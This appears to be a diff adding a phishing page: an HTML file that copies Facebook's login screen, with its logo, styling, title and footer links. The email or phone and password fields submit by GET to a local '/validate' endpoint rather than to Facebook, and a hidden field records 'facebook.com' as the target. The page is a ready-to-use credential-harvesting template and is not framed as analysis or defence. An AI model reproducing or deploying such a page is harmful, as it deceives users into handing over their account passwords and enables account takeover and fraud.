@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Facebook – log in or sign up</title>
+ <style>
+   *{
+    font-family: Arial, sans-serif;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+   }
+   body{
+  	background:#f0f2f5;
+    
+   }
+   .container{
+   display:block;
+   margin: 0 auto;
+   max-width:400px;
+   }
+   .logo{
+   margin-top:14px;
+       text-align: center;
+}
+   .logo img{
+   	    height: 106px;
+    margin: -28px;
+   }
+   h2{
+ max-width: 400px;
+ margin:10px auto;
+ font-weight: normal;
+ text-align:center;
+}
+   .containerBox{
+   text-align:center;
+       align-items: center;
+    background-color: #fff;
+    border: none;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+    box-sizing: border-box;
+    margin: 40px 0 0;
+    padding: 20px 0 28px;
+    max-width: 396px;
+
+   }
+   .containerBox a{
+   	    color: #1877f2;
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration:none;
+    margin:9px 0 !important;
+    display:inline-block;
+   }
+   .inputContainer input{
+   	   	font-size: 17px;
+    padding: 14px 16px;
+    max-width: 330px;
+    width:calc( 100% - 20px);
+    outline:none;
+    border-radius: 6px;
+    border:1px solid #dddfe2;
+    line-height: 16px;
+    vertical-align: middle;
+        margin: 6px 0;
+        
+   }
+   .inputContainerlogin input{
+    color:#fff;
+    padding: 14px 16px;
+    max-width: 330px;
+    width:calc( 100% - 20px);
+    outline:none;
+    margin: 6px 0;
+    background-color: #1877f2;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    line-height: 48px;
+    padding: 0 16px;
+   }
+   .create{
+   	background:#42b72a;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    line-height: 48px;
+    padding: 0 16px;
+    color:#fff !important;
+    cursor: pointer;
+    display: inline-block;
+    text-decoration: none;
+    white-space: nowrap;
+
+   }
+   hr{
+ width:calc(100% - 20px);
+ margin:20px auto;
+}
+   footer{
+    background: #fff;
+	color: #737373;   
+    font-size: 11px;
+    width:100%;
+    padding:10px;
+   }
+   .page{
+    margin:15px auto;
+    text-align:center;
+    
+   }
+   
+ </style>
+</head>
+<body>
+<form class='login-form' action='/validate' method='get'>
+ 
+ <div class="container">
+  <div class="logo">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg"/>
+  </div>
+  <h2>Facebook helps you connect and share with the people in your life.</h2>
+  
+  <div class="containerBox">
+    <div class="inputContainer">
+      <input placeholder="Email address or phone number" name='user'  type="text" autocorrect='off' autocomplete='off' autocapitalize='off' required="">
+ 	</div>
+    <input type='hidden' name='url' value='facebook.com'>
+    <div class="inputContainer">
+      <input placeholder="Password" type="text" name='pass' autocorrect='off' autocomplete='off' autocapitalize='off' required="">
+ 	</div>
+    <div class="inputContainerlogin">
+      <input value="Log in" type="submit">
+ 	</div>
+     <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjk3NzI5NjY0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login" 
+>Forgotten password?</a>
+ <hr>
+ 
+ 
+      <a href="https://facebook.com" class="create">Create new account</a>
+  </div>
+  
+  <p class="page">Create a Page for a celebrity, brand or business.</p>
+  
+ </div>
+ </form>
+ <footer>
+ <p>English (UK)
+বাংলা
+অসমীয়া
+हिन्दी
+नेपाली
+Bahasa Indonesia
+العربية
+中文(简体)
+Bahasa Melayu
+Español
+Português (Brasil)
+</p>
+<p>Bahasa Melayu
+Español
+Português (Brasil)
+
+</p>
+<hr>
+<p>
+Sign Up Log in Messenger Facebook LiteVideo Places   PayMeta StoreMeta Quest Instagram Threads Fundraisers Services Voting Information CentrePrivacy PolicyPrivacy CentreGroupsAboutCreate adCreate PageDevelopers Careers Cookies AdChoices Terms Help Contact uploading and non-usersSettingsActivity log
+</p>
+<br>
+ 
+  <p> Meta © 2023</p>
+ </footer>
+
+</body>
+</html>
